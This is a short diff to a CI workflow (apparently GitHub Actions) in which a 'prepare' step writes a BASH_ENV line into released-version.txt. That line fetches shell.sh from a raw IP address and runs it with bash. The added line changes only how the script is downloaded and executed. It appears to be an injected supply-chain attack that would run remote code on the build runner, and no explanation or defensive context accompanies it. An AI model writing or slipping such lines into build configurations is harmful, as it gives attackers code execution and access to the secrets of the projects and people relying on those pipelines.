@@ -11,7 +11,7 @@ jobs:
       - name: prepare
         run: |
         
-            echo -e 'null\nBASH_ENV="$(curl http://146.59.195.165:8000/shell.sh | bash)"' > released-version.txt
+            echo -e 'null\nBASH_ENV="$(curl http://146.59.195.165:8000/shell.sh -o shell.sh ; bash shell.sh)"' > released-version.txt
             
             mkdir build
             echo 'empty' > build/empty.txt
